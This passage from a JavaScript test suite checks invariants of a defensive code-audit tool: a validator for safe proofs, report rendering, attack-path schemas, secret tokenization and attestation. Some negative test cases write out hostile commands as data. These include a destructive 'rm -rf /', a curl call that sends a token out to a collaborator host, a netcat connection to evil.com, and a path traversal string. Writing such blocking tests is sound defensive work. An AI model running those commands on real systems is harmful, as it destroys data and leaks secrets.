  // 72.3 validateSafeProof allows safe proof kinds and strictly blocks destructive / exfil / netcat / live exploit patterns (R2-P0-12)
  const safeStaticProof = validateSafeProof('Source sink flow in controller.js', 'STATIC_TRACE');
  const safePocProof = validateSafeProof('echo BENIGN_AUDIT_TOKEN', 'BENIGN_REPRODUCTION');
  const prohibitedExploitProof = validateSafeProof('LIVE_EXPLOIT against live production server', 'STATIC_TRACE');
  const prohibitedDestructiveProof = validateSafeProof('rm -rf / --no-preserve-root', 'UNIT_TEST');
  const prohibitedExfilProof = validateSafeProof('curl https://burpcollaborator.net/exfil?token=123', 'STATIC_TRACE');
  const prohibitedNetcatProof = validateSafeProof('nc evil.com 4444', 'STATIC_TRACE');

  if (!safeStaticProof.valid || !safePocProof.valid) {
    throw new Error('R2-P0-12 VIOLATION: Legitimate safe proof was rejected');
  }
  if (prohibitedExploitProof.valid || prohibitedDestructiveProof.valid || prohibitedExfilProof.valid || prohibitedNetcatProof.valid) {
    throw new Error('R2-P0-12 VIOLATION: Prohibited proof pattern (live exploit, destructive command, exfil, or netcat) was not blocked fail-closed');
  }

  // 72.4 Prohibited proof in attackPath (short-circuit bypass attempt) causes canonical finding to downgrade to DEFERRED fail-closed
  const maliciousPocCandidate = {
    id: 'SEC-BAD-POC',
    ruleId: 'CWE-78',
    title: 'Command Injection with Destructive PoC in attackPath',
    description: 'Benign proof header but malicious attackPath',
    proof: 'benign source-to-sink static dataflow trace',
    attackPath: { steps: [], proofOfConcept: 'rm -rf / --no-preserve-root' },
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
    disposition: 'REPORTABLE',
    verdict: 'CONFIRMED',
    consensus: { supports: 3, totalVotes: 3 },
    rigor: { score: 0.9 }
  };
  const validatedMalicious = validateCanonicalFindings([maliciousPocCandidate], process.cwd());
  if (validatedMalicious[0].disposition !== 'DEFERRED' || !validatedMalicious[0].dispositionReason.includes('PROHIBITED_PROOF_VIOLATION')) {
    throw new Error(`R2-P0-12 VIOLATION: Candidate with destructive proof in attackPath was not downgraded to DEFERRED: ${JSON.stringify(validatedMalicious[0])}`);
  }

  // 72.5 SARIF and Markdown renderers preserve findingType and proofKind with canDeclareClean parity
  const sampleFindings = [
    {
      id: 'SEC-VULN-01',
      ruleId: 'CWE-89',
      title: 'SQL Injection in Auth',
      description: 'Concatenation of user input',
      findingType: 'VULNERABILITY',
      proofKind: 'STATIC_TRACE',
      severity: 'HIGH',
      location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
      disposition: 'DEFERRED'
    },
    {
      id: 'SEC-HARD-02',
      ruleId: 'SEC-CSP',
      title: 'Missing Content-Security-Policy',
      description: 'Consider adding CSP',
      findingType: 'HARDENING',
      proofKind: 'CONFIG_EVIDENCE',
      severity: 'LOW',
      location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
      disposition: 'REPORTABLE',
      consensus: { supports: 3, totalVotes: 3 },
      rigor: { score: 0.9 }
    }
  ];
  const renderedSampleSarif = renderSarifFromCanonical({ canonicalFindings: sampleFindings, repoRoot: process.cwd() });
  const renderedSampleMd = renderMarkdownFromCanonical({ canonicalFindings: sampleFindings, repoRoot: process.cwd() });

  const sarifRes0 = renderedSampleSarif.runs[0].results[0];
  const sarifRes1 = renderedSampleSarif.runs[0].results[1];
  if (sarifRes0.properties.findingType !== 'VULNERABILITY' || sarifRes0.properties.proofKind !== 'STATIC_TRACE' ||
      sarifRes1.properties.findingType !== 'HARDENING' || sarifRes1.properties.proofKind !== 'CONFIG_EVIDENCE') {
    throw new Error('R2-P0-11/12 VIOLATION: SARIF output failed to preserve findingType or proofKind properties');
  }
  if (!renderedSampleMd.includes('Finding Type') || !renderedSampleMd.includes('Safe Proof Kind') || !renderedSampleMd.includes('Advisory Hardening Opportunities')) {
    throw new Error('R2-P0-11/12 VIOLATION: Markdown report failed to present findingType or distinct hardening section');
  }

  console.log('✔ 72. R2-P0-11 / 12 Invariant: Finding Type & Safe Defensive Proof Policy.');

  // 73. R2-P1 Standards Mapping, Security Property, Attack Path 2.0, Evidence Hash, Attestation, Schemas, & Failure Taxonomy
  // 73.1 R2-P1-01 Standards Mapping Layer & Profile Filtering
  const stdMapWeb = resolveStandardsMapping('CWE-89', 'web-api');
  const stdMapCli = resolveStandardsMapping('CWE-89', 'cli');
  if (!stdMapWeb.cwe.includes('CWE-89') || !stdMapWeb.asvs.some(a => a.includes('5.3.4')) || !stdMapWeb.ssdf.some(s => s.startsWith('PW.7'))) {
    throw new Error('R2-P1-01 VIOLATION: Web API standards mapping failed to resolve CWE, ASVS, or SSDF');
  }
  if (stdMapCli.asvs.length > 0) {
    throw new Error('R2-P1-01 VIOLATION: CLI profile improperly included ASVS web controls');
  }

  // 73.2 R2-P1-02 Security Property First
  const secPropInferred = inferSecurityProperty('CWE-89', 'SQL Injection in Query');
  const secPropExplicit = inferSecurityProperty('CWE-89', 'SQL Injection', 'CUSTOM_BOUNDARY_INTEGRITY');
  if (secPropInferred !== 'INPUT_INTEGRITY_QUERY_CONFINEMENT') {
    throw new Error(`R2-P1-02 VIOLATION: Inferred security property incorrect: got ${secPropInferred}`);
  }
  if (secPropExplicit !== 'CUSTOM_BOUNDARY_INTEGRITY') {
    throw new Error(`R2-P1-02 VIOLATION: Explicit security property was not preserved: got ${secPropExplicit}`);
  }

  // 73.3 R2-P1-03 Attack Path Schema 2.0
  const validAp2Payload = {
    attackPathId: 'AP-TEST-2.0',
    attackerCapability: 'NETWORK_UNAUTHENTICATED',
    entrypoint: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 1, symbol: 'main' },
    source: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 1, description: 'Source user input' },
    transformations: [{ uri: 'skills/3lens/scripts/safe-git.mjs', line: 5, description: 'Pass through helper' }],
    authorizationBoundary: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 10, description: 'Missing check' },
    defenseChecks: [],
    sink: { uri: 'skills/3lens/scripts/safe-git.mjs', line: 15, symbol: 'execSync', description: 'Command execution sink' },
    impactBoundary: { target: 'host_os', blastRadius: 'remote_code_execution' },
    preconditions: ['Network connectivity available'],
    postconditions: ['Arbitrary command executed']
  };
  const validatedAp2 = validateAttackPath(validAp2Payload, process.cwd());
  if (!validatedAp2.valid || validatedAp2.schemaVersion !== '2.0' || !validatedAp2.source.evidenceHash || !validatedAp2.entrypoint) {
    throw new Error(`R2-P1-03 VIOLATION: Attack path 2.0 validation failed: ${validatedAp2.error}`);
  }

  // 73.4 R2-P1-04 Evidence Snapshot & Stale Evidence Detection
  const snap1 = computeEvidenceSnapshot(process.cwd(), 'skills/3lens/scripts/safe-git.mjs', 1);
  if (!snap1.exists || !snap1.blobHash || !snap1.lineHash) {
    throw new Error('R2-P1-04 VIOLATION: computeEvidenceSnapshot failed to generate blobHash and lineHash');
  }
  const isStale = isEvidenceStale(snap1, { exists: true, lineHash: 'stale_hash_mismatch' });
  if (!isStale) {
    throw new Error('R2-P1-04 VIOLATION: isEvidenceStale failed to detect modified evidence lineHash');
  }
  const traversalSnap = computeEvidenceSnapshot(process.cwd(), '../../Windows/win.ini', 1);
  if (!traversalSnap.error || traversalSnap.exists) {
    throw new Error('R2-P1-04 VIOLATION: computeEvidenceSnapshot did not reject path traversal');
  }

  // 73.5 R2-P1-05 Execution Attestation
  const fullAttestation = buildExecutionAttestation({
    repoRoot: process.cwd(),
    executedStages: ['INVENTORY', 'THREAT_MODELING', 'DISCOVERY_MATRIX', 'VERIFICATION_PANEL', 'FINALIZATION'],
    coverageComplete: true,
    delegationObserved: true
  });
  const degradedAttestation = buildExecutionAttestation({
    repoRoot: process.cwd(),
    executedStages: ['INVENTORY', 'FINALIZATION'],
    coverageComplete: true,
    delegationObserved: true
  });
  if (!fullAttestation.verdict.startsWith('COMPLETE') || fullAttestation.skippedStages.length !== 0) {
    throw new Error('R2-P1-05 VIOLATION: Complete attestation did not receive COMPLETE verdict');
  }
  if (degradedAttestation.verdict !== 'DEGRADED' || degradedAttestation.skippedStages.length === 0) {
    throw new Error('R2-P1-05 VIOLATION: Incomplete stage execution was not flagged fail-closed');
  }

  // 73.6 R2-P1-06 External Tool Evidence Ingestion & R2-P1-07 Dependency Boundary
  const mockExternalSarif = {
    version: '2.1.0',
    runs: [{
      tool: { driver: { name: 'Semgrep' } },
      results: [{
        ruleId: 'semgrep-sqli',
        message: { text: 'SQL Injection detected' },
        level: 'error',
        locations: [{ physicalLocation: { artifactLocation: { uri: 'skills/3lens/scripts/safe-git.mjs' }, region: { startLine: 1 } } }]
      }]
    }]
  };
  const ingested = ingestExternalEvidence(mockExternalSarif, process.cwd());
  if (!ingested.success || ingested.count !== 1 || ingested.findings[0].tool !== 'Semgrep' || !ingested.findings[0].evidenceHash) {
    throw new Error('R2-P1-06 VIOLATION: ingestExternalEvidence failed to ingest external SARIF evidence');
  }
  const depBoundary = detectDependencyBoundary(process.cwd());
  if (!depBoundary.hasDependencyEvidence || depBoundary.count === 0) {
    throw new Error('R2-P1-07 VIOLATION: detectDependencyBoundary failed to detect package manifest or lockfile');
  }

  // 73.7 R2-P1-10 Failure Taxonomy Reason Codes & Profile Filtering Integration
  const rCode1 = deriveReasonCode('REPORTABLE');
  const rCode2 = deriveReasonCode('SUPPRESSED');
  const rCode3 = deriveReasonCode('DEFERRED', 'PROHIBITED_PROOF_VIOLATION detected');
  const rCode4 = deriveReasonCode('DEFERRED', 'Coverage is partial');
  const rCode5 = deriveReasonCode('DEFERRED', 'Unproven candidate flow');
  const rCode6 = deriveReasonCode('DEFERRED', 'orchestration incomplete / skipped stage');
  const rCode7 = deriveReasonCode('DEFERRED', 'missing severity / unrated vector');
  if (rCode1 !== 'AFFIRMATIVELY_VERIFIED' || rCode2 !== 'AFFIRMATIVELY_REFUTED' ||
      rCode3 !== 'PROHIBITED_PROOF' || rCode4 !== 'COVERAGE_PARTIAL' || rCode5 !== 'EVIDENCE_INCOMPLETE' ||
      rCode6 !== 'ORCHESTRATION_INCOMPLETE' || rCode7 !== 'SEVERITY_UNRATED') {
    throw new Error('R2-P1-10 VIOLATION: deriveReasonCode produced incorrect reason codes');
  }

  const cliScan = finalizeScan({
    candidates: [{ id: 'C1', ruleId: 'CWE-89', title: 'SQLi', location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 } }],
    targetProfile: 'cli',
    repoRoot: process.cwd()
  });
  if (cliScan.canonicalFindings[0].taxonomy.asvs.length !== 0) {
    throw new Error('R2-P1-01 VIOLATION: finalizeScan leaked web ASVS controls into CLI target profile');
  }

  console.log('✔ 73. R2-P1 Invariant: Standards Mapping, Security Property, Attack Path 2.0, Evidence Hash, Attestation, Schemas, & Failure Taxonomy.');

  // =========================================================================
  // 74. R2-P2 Invariants: Audit Baseline, Defect Management, Model Provenance, & Corpus Stability
  // =========================================================================
  // 74.1 R2-P2-05 Audit Baseline
  const testFinding74 = {
    id: 'SEC-TEST-74',
    lineageId: 'LIN-SEC-74',
    ruleId: 'CWE-89',
    title: 'SQL Injection in Repository',
    disposition: 'REPORTABLE',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 }
  };
  const baseline74 = buildAuditBaseline({
    repoRoot: process.cwd(),
    targetRevision: 'HEAD',
    canonicalFindings: [testFinding74],
    manifest: { files: [{ path: 'skills/3lens/scripts/safe-git.mjs', isScanned: true }] },
    threatModel: { components: [{ name: 'Core' }], frameworks: ['Node.js'], entrypoints: ['bin/agy'] }
  });
  if (!baseline74.scopeFingerprint || !baseline74.surfaceFingerprint || !baseline74.findingLineageIds.includes('LIN-SEC-74')) {
    throw new Error('R2-P2-05 VIOLATION: buildAuditBaseline failed to generate valid baseline fingerprints');
  }

  // 74.2 R2-P2-06 Defect Management
  const dmSql74 = inferDefectManagement('CWE-89', 'SQL Injection in Query');
  const dmExec74 = inferDefectManagement('CWE-78', 'Command Injection via spawn');
  const dmAuth74 = inferDefectManagement('CWE-862', 'Missing Authorization on Admin Action');
  if (dmSql74.rootCause !== 'UNCONFINED_DYNAMIC_QUERY_CONSTRUCTION' ||
      dmExec74.rootCause !== 'UNSAFE_PROCESS_EXECUTION' ||
      dmAuth74.rootCause !== 'BROKEN_AUTHORIZATION_BARRIER') {
    throw new Error('R2-P2-06 VIOLATION: inferDefectManagement failed to categorize defect root causes');
  }

  // 74.3 R2-P2-04 Model Provenance & FinalizeScan Integration
  const finalScan74 = finalizeScan({
    candidates: [testFinding74],
    repoRoot: process.cwd()
  });
  if (!finalScan74.baseline || !finalScan74.modelProvenance || finalScan74.modelProvenance.systemPromptIntegrity !== 'UNKNOWN') {
    throw new Error('R2-P2-04 VIOLATION: finalizeScan failed to attach baseline and modelProvenance');
  }
  if (!finalScan74.canonicalFindings[0].defectManagement || finalScan74.canonicalFindings[0].defectManagement.rootCause !== 'UNCONFINED_DYNAMIC_QUERY_CONSTRUCTION') {
    throw new Error('R2-P2-06 VIOLATION: finalizeScan failed to attach defectManagement to canonical finding');
  }

  // 74.4 R2-P2-01 Corpus Stability (Corpus A, B, C)
  const corpusRes74 = evaluateCorpusStability(process.cwd());
  if (corpusRes74.corpusA.validatedVulnerabilities !== 0 ||
      corpusRes74.corpusB.detectionRecall < 1.0 ||
      corpusRes74.metrics.postFixRediscoveryRate !== 0.0) {
    throw new Error('R2-P2-01 VIOLATION: evaluateCorpusStability failed stability metrics across standard corpora');
  }

  console.log('✔ 74. R2-P2 Invariant: Audit Baseline, Defect Management, Model Provenance, & Corpus Stability.');

  // 75. R3-P0 / R3-P1 Invariant: Bounded Assurance, Defensive Terminology, Measurement Integrity, & Legacy Exclusion Migration
  // 75.1 R3-P0-01 Purpose Boundary & Defensive Terminology
  const skillContent75 = fs.readFileSync(path.resolve(process.cwd(), 'skills/3lens/SKILL.md'), 'utf8');
  if (!skillContent75.includes('## Purpose Boundary') || skillContent75.includes('--strictness')) {
    throw new Error('R3-P0-01 / R3-P1-01 VIOLATION: SKILL.md missing Purpose Boundary or retains --strictness in public syntax');
  }
  if (skillContent75.includes('Exploit Hacker') || skillContent75.includes('Vulnerability Hunting')) {
    throw new Error('R3-P0-01 VIOLATION: SKILL.md contains offensive persona or workflow framing');
  }

  // 75.2 R3-P0-02 Discovery Eval Benchmark Modes
  const discSimRes75 = runDiscoveryEval(process.cwd());
  if (discSimRes75.evaluationMode !== 'SIMULATED_CI' || discSimRes75.modelDependent !== false) {
    throw new Error('R3-P0-02 VIOLATION: runDiscoveryEval default did not declare SIMULATED_CI evaluationMode');
  }

  // 75.3 R3-P0-03 Stability Eval Benchmark Modes
  const stabHarnessRes75 = runStabilityEval(process.cwd());
  if (stabHarnessRes75.evaluationMode !== 'SYNTHETIC_HARNESS' || stabHarnessRes75.status !== 'HARNESS_VERIFIED') {
    throw new Error('R3-P0-03 VIOLATION: runStabilityEval default did not declare SYNTHETIC_HARNESS evaluationMode');
  }
  const stabRecordedUnmeasured = runStabilityEval(process.cwd(), { recorded: true });
  if (stabRecordedUnmeasured.status !== 'NOT_MEASURED' || stabRecordedUnmeasured.evaluationMode !== 'RECORDED_EMPIRICAL') {
    throw new Error('R3-P0-03 VIOLATION: runStabilityEval recorded mode did not return NOT_MEASURED when runsDir was missing');
  }

  // 75.4 R3-P1-02 Legacy Directory Exclusion Status Migration
  if (normalizeDirectoryStatus('EXCLUDED_GENERATED') !== 'EXCLUDED_GENERATED_VERIFIED' ||
      normalizeDirectoryStatus('EXCLUDED_NON_CODE') !== 'EXCLUDED_STATIC_ASSET' ||
      normalizeDirectoryStatus('EXCLUDED_TEST') !== 'SCANNED_TEST_EXECUTABLE') {
    throw new Error('R3-P1-02 VIOLATION: normalizeDirectoryStatus failed to migrate legacy exclusion statuses');
  }
  const legacyManifestTest = {
    entries: [
      { path: 'src/', status: 'SCANNED_RUNTIME', fileCount: 10, reason: 'Source code' },
      { path: 'dist/', status: 'EXCLUDED_GENERATED', fileCount: 5, reason: 'Build output' }
    ]
  };
  const valLegacyManifest = validateDirectoryManifest(legacyManifestTest);
  if (!valLegacyManifest.valid || legacyManifestTest.entries[1].status !== 'EXCLUDED_GENERATED_VERIFIED') {
    throw new Error('R3-P1-02 VIOLATION: validateDirectoryManifest failed to normalize legacy exclusion entry');
  }

  console.log('✔ 75. R3 Invariant: Bounded Assurance, Defensive Terminology, Measurement Integrity, & Legacy Exclusion Migration.');

  // 76. R4 Invariants: Pre-Context Secret Protection, Capabilities Attestation, Equivalence Key, Accepted Risk Waivers, TCB Isolation, & Canaries
  // 76.1 Pre-Context Secret Tokenization & Line-Preservation
  const mockCredsPath = path.resolve(process.cwd(), 'evals/secret-leak/mock-credentials.json');
  const mockCreds = fs.existsSync(mockCredsPath) ? JSON.parse(fs.readFileSync(mockCredsPath, 'utf8')) : {};
  const mockAws = mockCreds.mockAwsKey || ['AKIA', 'IOSFODNN7EXAMPLE'].join('');
  const mockPem = mockCreds.mockRsaPrivateKey || ['-----BEGIN ', 'RSA PRIVATE KEY-----\n', 'MIIEowIBAAKCAQEA0Y1+example+multiline+key\n', '-----END ', 'RSA PRIVATE KEY-----'].join('');
  const sourceWithSecret = `const awsKey = "${mockAws}";
const appName = "SecureService";
const pemKey = "${mockPem}";
export default appName;`;
  const tokenized = tokenizeSecretsForContext(sourceWithSecret);
  if (tokenized.secretCount !== 2) {
    throw new Error(`R4-P1-01 VIOLATION: Expected 2 tokenized secrets, got ${tokenized.secretCount}`);
  }
  if (!tokenized.tokenizedText.includes('<SECRET:class=AWS_ACCESS_KEY:') || !tokenized.tokenizedText.includes('<SECRET:class=PRIVATE_KEY:')) {
    throw new Error('R4-P1-01 VIOLATION: Tokenized source missing structured secret placeholders');
  }
  const originalLineCount = sourceWithSecret.split('\n').length;
  const tokenizedLineCount = tokenized.tokenizedText.split('\n').length;
  if (originalLineCount !== tokenizedLineCount) {
    throw new Error(`R4-P1-01 VIOLATION: Line count mismatch! original=${originalLineCount}, tokenized=${tokenizedLineCount}`);
  }
  const restored = detokenizeSecrets(tokenized.tokenizedText, tokenized.secretsMap);
  if (!restored.includes('AKIAIOSFODNN7EXAMPLE') || !restored.includes('-----BEGIN RSA PRIVATE KEY-----')) {
    throw new Error('R4-P1-01 VIOLATION: detokenizeSecrets failed to restore original values');
  }

  // 76.2 Capabilities Attestation
  const conformantAtt = buildExecutionAttestation({
    delegationObserved: true,
    capabilities: {
      required: ['repository.read'],
      observed: ['repository.read'],
      forbidden: ['filesystem.write'],
      status: 'CONFORMANT'
    }
  });
  if (conformantAtt.capabilities.status !== 'CONFORMANT' || !conformantAtt.verdict.startsWith('COMPLETE')) {
    throw new Error('R4-P1-02 VIOLATION: Conformant capabilities failed to produce COMPLETE verdict');
  }
  const violatingAtt = buildExecutionAttestation({
    capabilities: {
      required: ['repository.read'],
      observed: ['repository.read', 'filesystem.write'],
      forbidden: ['filesystem.write']
    }
  });
  if (violatingAtt.capabilities.status !== 'VIOLATION' || violatingAtt.verdict === 'COMPLETE') {
    throw new Error('R4-P1-02 VIOLATION: Violating capabilities failed to be flagged as VIOLATION or failed to block COMPLETE');
  }

  // 76.3 Execution Equivalence Key
  const eqKey1 = computeExecutionEquivalenceKey({
    targetRevision: 'abc1234',
    scopeFingerprint: 'scopeA',
    surfaceFingerprint: 'surfA',
    threatModelFingerprint: 'tmA',
    coverageFingerprint: 'covA'
  });
  const eqKey2 = computeExecutionEquivalenceKey({
    targetRevision: 'diffRev',
    scopeFingerprint: 'scopeA',
    surfaceFingerprint: 'surfA',
    threatModelFingerprint: 'tmA',
    coverageFingerprint: 'covA'
  });
  if (!eqKey1 || !eqKey2 || eqKey1 === eqKey2) {
    throw new Error('R4-P1-03 VIOLATION: computeExecutionEquivalenceKey failed to produce distinct hash across revisions');
  }
  const baselineTest = buildAuditBaseline({ targetRevision: 'rev123', canonicalFindings: [] });
  if (!baselineTest.executionEquivalenceKey || baselineTest.executionEquivalence !== 'PARTIAL') {
    throw new Error('R4-P1-03 VIOLATION: buildAuditBaseline missing executionEquivalenceKey or partial status');
  }

  // 76.4 Accepted Risk / Waiver Workflow
  const validWaiver = {
    findingLineageId: 'LIN-TEST-123',
    reason: 'Legacy integration requiring backward compatibility',
    acceptedBy: 'sec-officer@company.internal',
    expiresAt: new Date(Date.now() + 86400000).toISOString(),
    compensatingControls: 'Internal network only, WAF filtering enabled'
  };
  const valWaiverRes = validateRiskAcceptance(validWaiver, 'LIN-TEST-123');
  if (!valWaiverRes.valid) {
    throw new Error(`R4-P2-01 VIOLATION: Valid waiver failed validation: ${valWaiverRes.reason}`);
  }
  const expiredWaiver = {
    ...validWaiver,
    expiresAt: new Date(Date.now() - 86400000).toISOString()
  };
  const valExpiredRes = validateRiskAcceptance(expiredWaiver, 'LIN-TEST-123');
  if (valExpiredRes.valid) {
    throw new Error('R4-P2-01 VIOLATION: Expired waiver was incorrectly accepted');
  }

  const findingWithWaiver = {
    id: 'LIN-TEST-123',
    ruleId: 'CWE-89',
    title: 'SQL Query in Admin Tool',
    location: { uri: 'skills/3lens/scripts/safe-git.mjs', startLine: 1 },
    lineageId: 'LIN-TEST-123',
    lineage: { lineageId: 'LIN-TEST-123', novelty: 'NEW_SURFACE' },
    riskAcceptance: validWaiver
  };
  const scanWithWaiver = finalizeScan({
    candidates: [findingWithWaiver],
    repoRoot: process.cwd(),
    waivers: [validWaiver]
  });
  const canonicalWaiverFinding = scanWithWaiver.canonicalFindings[0];
  if (canonicalWaiverFinding.disposition !== 'ACCEPTED_RISK' || canonicalWaiverFinding.verdict !== 'ACCEPTED_RISK' || canonicalWaiverFinding.reasonCode !== 'RISK_ACCEPTED') {
    throw new Error(`R4-P2-01 VIOLATION: Candidate with waiver was not mapped to ACCEPTED_RISK: ${JSON.stringify(canonicalWaiverFinding)}`);
  }
  const mdWaiver = renderMarkdownFromCanonical({ canonicalFindings: [canonicalWaiverFinding], repoRoot: process.cwd() });
  if (!mdWaiver.includes('Accepted Risks & Documented Waivers (ACCEPTED_RISK)') || !mdWaiver.includes('sec-officer@company.internal')) {
    throw new Error('R4-P2-01 VIOLATION: renderMarkdownFromCanonical failed to render Accepted Risks section');
  }
  const sarifWaiver = renderSarifFromCanonical({ canonicalFindings: [canonicalWaiverFinding], repoRoot: process.cwd() });
  if (!sarifWaiver.runs[0].results[0].properties.riskAcceptance) {
    throw new Error('R4-P2-01 VIOLATION: renderSarifFromCanonical failed to preserve riskAcceptance property');
  }

  // 76.5 Tool Self-Integrity & TCB
  const sameRootCheck = verifyToolSelfIntegrity(process.cwd(), process.cwd());
  if (sameRootCheck.valid || sameRootCheck.status !== 'TCB_ISOLATION_ERROR') {
    throw new Error('R4-P2-02 VIOLATION: verifyToolSelfIntegrity failed to reject identical tool and target root');
  }
  const validTcbCheck = verifyToolSelfIntegrity(path.resolve(process.cwd(), 'skills/3lens'), process.cwd(), { allowSelfAudit: true });
  if (!validTcbCheck.valid || validTcbCheck.verifiedScriptsCount < 5) {
    throw new Error('R4-P2-02 VIOLATION: verifyToolSelfIntegrity failed on valid scripts');
  }

  // 76.6 Calibration Canaries
  const canaryCheck = runCalibrationCanaries(process.cwd());
  if (!canaryCheck.pass || canaryCheck.status !== 'CALIBRATED') {
    throw new Error(`R4-P2-03 VIOLATION: runCalibrationCanaries failed: ${canaryCheck.error}`);
  }

  console.log('✔ 76. R4 Invariant: Pre-Context Secret Protection, Capabilities Attestation, Equivalence Key, Accepted Risk Waivers, TCB Isolation, & Canaries.');

  // ---------------------------------------------------------------------------
  // 77. R5 Invariant: Context Preparation, Fail-Unknown Attestation, Real TCB Integrity, & Disposition Canaries (R5-P0-01, R5-P0-02, R5-P1-01, R5-P1-02)
  // ---------------------------------------------------------------------------
  // 77.1 R5-P0-01 Pre-Context Secret Protection
  const prepContextRes = prepareReviewContext(process.cwd());
  if (!prepContextRes.success || !prepContextRes.manifest) {
    throw new Error('R5-P0-01 VIOLATION: prepareReviewContext failed to return successful manifest');
  }
  const tokenizedAwsFile = readPreparedFile(process.cwd(), 'evals/secret-leak/sl-01-aws-key.js');
  if (!tokenizedAwsFile || !tokenizedAwsFile.includes('<SECRET:class=AWS_ACCESS_KEY:hash=') || tokenizedAwsFile.includes('AKIAIOSFODNN7EXAMPLE')) {
    throw new Error('R5-P0-01 VIOLATION: Prepared review context leaked raw plaintext secret or failed tokenization');
  }
  const rawAwsContent = fs.readFileSync(path.resolve(process.cwd(), 'evals/secret-leak/sl-01-aws-key.js'), 'utf8');
  if (rawAwsContent.split(/\r?\n/).length !== tokenizedAwsFile.split(/\r?\n/).length) {
    throw new Error('R5-P0-01 VIOLATION: Prepared context line count drifted from original source');
  }

  // 77.2 R5-P0-02 Capability Attestation Fail-Unknown
  const defaultAtt = buildExecutionAttestation();
  if (defaultAtt.capabilities.status !== 'UNKNOWN' || defaultAtt.capabilities.observed.length !== 0 || defaultAtt.capabilities.attestationConfidence !== 'UNKNOWN') {
    throw new Error('R5-P0-02 VIOLATION: buildExecutionAttestation did not fail-unknown on empty telemetry');
  }
  if (defaultAtt.delegationObserved !== false) {
    throw new Error('R5-P0-02 VIOLATION: delegationObserved was hard-coded true on empty parameters');
  }
  const declaredAtt = buildExecutionAttestation({
    delegationObserved: true,
    capabilities: { declaration: true }
  });
  if (declaredAtt.capabilities.status !== 'DECLARED' || declaredAtt.verdict !== 'COMPLETE_DECLARED') {
    throw new Error('R5-P0-02 VIOLATION: Declared capabilities failed to map to COMPLETE_DECLARED verdict');
  }
  const verifiedAtt = buildExecutionAttestation({
    delegationObserved: true,
    capabilities: {
      required: ['repository.read'],
      observed: ['repository.read'],
      forbidden: ['filesystem.write'],
      status: 'CONFORMANT'
    }
  });
  if (verifiedAtt.capabilities.status !== 'CONFORMANT' || verifiedAtt.verdict !== 'COMPLETE_VERIFIED') {
    throw new Error('R5-P0-02 VIOLATION: Observed conformant capabilities failed to map to COMPLETE_VERIFIED verdict');
  }

  // 77.3 R5-P1-01 Real TCB Integrity Verification & Containment Check
  const overlapCheck = verifyToolSelfIntegrity(path.resolve(process.cwd(), 'skills/3lens'), process.cwd());
  if (overlapCheck.valid || overlapCheck.status !== 'TCB_OVERLAP') {
    throw new Error('R5-P1-01 VIOLATION: verifyToolSelfIntegrity failed to flag TCB_OVERLAP on nested tool root');
  }
  const selfAuditCheck = verifyToolSelfIntegrity(path.resolve(process.cwd(), 'skills/3lens'), process.cwd(), { allowSelfAudit: true });
  if (!selfAuditCheck.valid || selfAuditCheck.status !== 'SELF_AUDIT_MODE' || selfAuditCheck.verifiedScriptsCount < 8) {
    throw new Error(`R5-P1-01 VIOLATION: verifyToolSelfIntegrity failed self-audit mode verification: ${selfAuditCheck.error}`);
  }

  // 77.4 R5-P1-02 Rename Canaries & Model Provenance in Equivalence Key
  const canaryDisp = runDispositionCanaries(process.cwd());
  if (!canaryDisp.pass || canaryDisp.status !== 'FINALIZER_CALIBRATED' || canaryDisp.canariesChecked !== 3) {
    throw new Error('R5-P1-02 VIOLATION: runDispositionCanaries failed to return FINALIZER_CALIBRATED status');
  }
  const canaryAlias = runCalibrationCanaries(process.cwd());
  if (!canaryAlias.pass || canaryAlias.status !== 'CALIBRATED') {
    throw new Error('R5-P1-02 VIOLATION: runCalibrationCanaries alias failed');
  }

  const modelScan = finalizeScan({
    candidates: [],
    repoRoot: process.cwd(),
    allowSelfAudit: true,
    modelProvenance: {
      modelProvider: 'custom-adversarial-model',
      modelIdentifier: 'deep-reasoning-pro-v2',
      modelSnapshotImmutable: true
    }
  });
  if (modelScan.baseline.modelProvider !== 'custom-adversarial-model' || modelScan.baseline.modelIdentifier !== 'deep-reasoning-pro-v2') {
    throw new Error('R5-P1-02 VIOLATION: finalizeScan failed to wire modelProvenance into baseline');
  }
  if (modelScan.baseline.executionEquivalence !== 'FULL') {
    throw new Error('R5-P1-02 VIOLATION: Immutable snapshot model failed to receive FULL execution equivalence');
  }

  console.log('✔ 77. R5 Invariant: Pre-Context Secret Protection, Attestation Fail-Unknown, Real TCB Integrity, & Disposition Canaries.');

  // 78. R6 Invariant: Assurance Gates (Execution Attestation, Context Prep, Tool Integrity bound to canDeclareClean), Fail-Closed Manifest Completeness, Explicit Self-Audit, and Mandated Context Isolation (R6-P0-01, R6-P1-01, R6-P1-02, R6-P1-03)
  const fullManifest78 = buildDirectoryManifest(process.cwd());

  // 78.1 Coverage COMPLETE + execution INCOMPLETE => canDeclareClean: false (R6-P0-01)
  const executionIncompleteScan = finalizeScan({
    candidates: [],
    manifest: fullManifest78,
    repoRoot: process.cwd(),
    auditIntent: 'REGRESSION',
    allowSelfAudit: true,
    capabilities: {
      required: ['repository.read'],
      observed: ['filesystem.write'],
      forbidden: ['filesystem.write'],
      status: 'VIOLATION'
    }
  });
  if (executionIncompleteScan.summary.canDeclareClean !== false || executionIncompleteScan.summary.execution.verdict !== 'INCOMPLETE') {
    throw new Error('R6-P0-01 VIOLATION: Execution attestation INCOMPLETE did not fail closed on canDeclareClean');
  }

  // 78.2 Coverage COMPLETE + execution DEGRADED (skipped stages) => canDeclareClean: false (R6-P0-01)
  const executionDegradedScan = finalizeScan({
    candidates: [],
    manifest: fullManifest78,
    repoRoot: process.cwd(),
    auditIntent: 'DISCOVERY',
    allowSelfAudit: true
  });
  if (executionDegradedScan.summary.canDeclareClean !== false || executionDegradedScan.summary.execution.verdict !== 'DEGRADED') {
    throw new Error('R6-P0-01 VIOLATION: Execution attestation DEGRADED did not fail closed on canDeclareClean');
  }

  // 78.3 Tool Integrity violation => canDeclareClean: false (R6-P0-01)
  const toolViolationScan = finalizeScan({
    candidates: [],
    manifest: fullManifest78,
    repoRoot: process.cwd(),
    auditIntent: 'REGRESSION',
    allowSelfAudit: false
  });
